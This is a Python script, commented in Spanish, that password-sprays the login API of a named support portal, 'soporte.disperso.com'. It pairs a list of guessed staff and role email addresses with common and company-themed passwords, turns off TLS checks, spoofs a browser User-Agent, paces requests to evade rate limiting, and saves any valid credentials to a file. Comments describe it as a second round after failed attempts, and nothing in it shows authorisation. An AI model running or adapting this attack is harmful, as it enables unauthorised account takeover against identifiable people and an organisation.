#!/usr/bin/env python3
"""Disperso spray ronda 2 — solo @disperso.com, delay 1.5s, VPS limpio"""
import requests, json, time, itertools
requests.packages.urllib3.disable_warnings()

URL = "https://soporte.disperso.com/api/auth/login"

# Solo @disperso.com (los @tuxpan.cl ya se probaron — 0 hits)
EMAILS = [
    # Nombres Tuxpan mapeados a disperso.com
    "casep@disperso.com","fcatrin@disperso.com","garate@disperso.com",
    "maureira@disperso.com","maurro@disperso.com","mfiguerc@disperso.com",
    "mmoossen@disperso.com","mnavea@disperso.com","smacias@disperso.com",
    "tuxpan@disperso.com",
    # Genericos altos probability
    "admin@disperso.com","soporte@disperso.com","support@disperso.com",
    "ops@disperso.com","dev@disperso.com","tech@disperso.com",
    "help@disperso.com","sales@disperso.com","cto@disperso.com",
    "carlos@disperso.com","diego@disperso.com","nicolas@disperso.com",
    "felipe@disperso.com","sebastian@disperso.com","andres@disperso.com",
    "pablo@disperso.com","rodrigo@disperso.com","matias@disperso.com",
]

# Top passwords primera ronda (antes que llegue 429 de nuevo ~350 combos max)
PASSWORDS = [
    "Disperso2024!","Disperso2025!","Disperso2026!",
    "Tuxpan2024!","Tuxpan2025!",
    "Admin1234!","Admin123!","admin123",
    "Soporte123!","Support123!",
    "Password1!","P@ssw0rd","Qwerty123!",
    "Chile2024!","Chile2025!",
]

results = {"hits":[], "tried":0}
total = len(EMAILS) * len(PASSWORDS)
print(f"[*] Ronda 2: {len(EMAILS)} emails x {len(PASSWORDS)} pwds = {total} combos")

sess = requests.Session()
sess.verify = False
sess.headers.update({"Content-Type": "application/json",
                     "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"})

for i, (email, pwd) in enumerate(itertools.product(EMAILS, PASSWORDS), 1):
    try:
        r = sess.post(URL, json={"email": email, "password": pwd}, timeout=12)
        results["tried"] += 1
        if r.status_code == 200:
            print(f"\n[!!!] HIT: {email}:{pwd}")
            results["hits"].append({"email":email,"password":pwd,"response":r.text[:500]})
        elif r.status_code == 429:
            print(f"  [429] Rate limit hit at {i} — waiting 60s...")
            time.sleep(60)
        elif r.status_code not in [401, 403]:
            print(f"  [?] {r.status_code} {email}:{pwd} -> {r.text[:80]}")
        if i % 100 == 0:
            print(f"  [{i}/{total}] hits={len(results['hits'])}")
    except Exception as e:
        results["tried"] += 1
    time.sleep(1.5)  # 1.5s delay - bajo el ratio vs ronda 1 (0.35s)

print(f"\n[*] Done: {results['tried']} tried, {len(results['hits'])} hits")
with open("/root/disperso_spray_r2.json","w") as f:
    json.dump(results, f, indent=2)
print("[*] /root/disperso_spray_r2.json")
